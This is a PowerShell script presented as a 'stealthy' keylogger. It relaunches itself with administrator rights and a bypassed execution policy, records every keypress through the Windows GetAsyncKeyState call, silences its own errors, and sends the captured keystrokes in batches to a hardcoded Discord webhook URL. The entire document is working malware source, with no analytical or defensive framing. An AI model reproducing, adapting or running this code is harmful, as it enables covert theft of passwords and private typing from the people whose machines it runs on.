# Stealthy PowerShell Keylogger with Discord Webhook 

# Function to Restart Script as Admin
function Restart-AsAdmin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $scriptPath = $PSCommandPath
        $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
        Start-Process powershell -Verb RunAs -ArgumentList $arguments
        exit
    }
}

# Run the function to check for admin rights
Restart-AsAdmin

# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1344607221740343337/lwdCUq4o12NlLCdVRyjodVoZLeUpvA_liHKdoo8tz0LvrfEekbLFnTDKbZEyScNzT_Zv"
# Function to send keylogs to Discord in batches
function Send-LogToDiscord {
    param([string]$message)

    try {
        $payload = @{ content = $message } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue
    } catch {
        # Prevent errors from being visible
    }
}

# Load Windows API to capture keypresses
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@ -Name "KeyLogger" -Namespace "KeyLoggerNamespace"

# Keylogger loop with batch sending
$log = ""
while ($true) {
    for ($i = 8; $i -lt 256; $i++) {
        if ([KeyLoggerNamespace.KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
            $key = switch ($i) {
                13 { "[ENTER]" }
                8  { "[BACKSPACE]" }
                9  { "[TAB]" }
                32 { "[SPACE]" }
                default { [char]$i }
            }
            $log += "$key "
        }
    }
    
    # Send logs in batches to avoid spamming
    if ($log.Length -gt 5) {
        Send-LogToDiscord -message "Keys: $log"
        $log = ""
    }
    
    Start-Sleep -Milliseconds 500
}
